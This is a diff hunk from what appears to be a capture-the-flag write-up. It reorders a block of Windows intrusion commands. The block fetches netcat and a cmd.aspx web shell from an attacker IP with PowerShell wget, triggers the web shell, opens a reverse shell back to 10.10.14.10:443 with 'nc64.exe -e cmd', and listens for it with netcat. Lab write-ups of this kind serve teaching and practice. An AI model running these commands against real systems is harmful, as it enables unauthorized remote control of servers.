@@ -225,11 +225,11 @@ http://127.0.0.1:8001/cmd.aspx
 ![image](https://github.com/user-attachments/assets/5d06d231-b107-4302-9ea5-0e63ef8330f0)
 
 ```
+wget https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64.exe
 cd C:\ProgramData
 powershell -c wget 10.10.14.10/nc64.exe -outfile nc64.exe
 cd C:\inetpub\development
 powershell -c wget 10.10.14.10/cmd.aspx -outfile cmd.aspx
-wget https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64.exe
 http://127.0.0.1:8001/cmd.aspx
 /c \ProgramData\nc64.exe -e cmd 10.10.14.10 443
 rlwrap -cAr nc -lnvp 443
